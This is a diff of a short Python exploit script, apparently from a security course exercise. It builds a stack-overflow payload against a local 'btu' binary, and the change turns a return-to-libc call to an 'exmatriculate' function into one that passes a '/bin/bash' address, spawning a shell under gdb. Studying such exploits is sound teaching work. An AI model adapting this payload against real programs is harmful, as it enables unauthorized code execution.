@@ -9,7 +9,7 @@ import sys
 
 
 # Fill content with non-zero values 
-content = bytearray(0x90 for i in range(68)) 
+content = bytearray(0x90 for i in range(64)) 
 
 # adding the basepointer address 
 base_pointer_address = 0xffffc888
@@ -17,7 +17,7 @@ base_pointer_address = 0xffffc888
 content[48:52] = (base_pointer_address).to_bytes(4, byteorder='little' )
 
 
-system_addr = 0x0804b0a8 # The address of exmatriculate 
+system_addr = 0xf7b5f170  # The address of exmatriculate 
 
 content[52:56] = (system_addr).to_bytes(4, byteorder='little' )
 
@@ -26,13 +26,8 @@ exit_addr = 0xf7b51460 # The address of exit ()
 
 content[56:60] = (exit_addr).to_bytes(4, byteorder='little' ) 
 
-btu_obj = 0x08050de0 # address of btu object. 
-content[60:64] = (btu_obj).to_bytes(4, byteorder='little') 
-
-student_addr = 1782914303   # hex value of student
-
-content[64:68] = (student_addr).to_bytes(4, byteorder='little') 
-
+bin_bash = 0xffffcccf # address of bin_bash object. 
+content[60:64] = (bin_bash).to_bytes(4, byteorder='little') 
 
 
 
@@ -41,5 +36,5 @@ escaped = ''.join('\\x{:02x}'.format(b) for b in content)
 
 
 
-print(f'gdb --args ./build/bin/btu remove 1782914303 $(echo -e "{escaped}")')
+print(f'gdb --args ./build/bin/btu remove 1024 $(echo -e "{escaped}")')
 
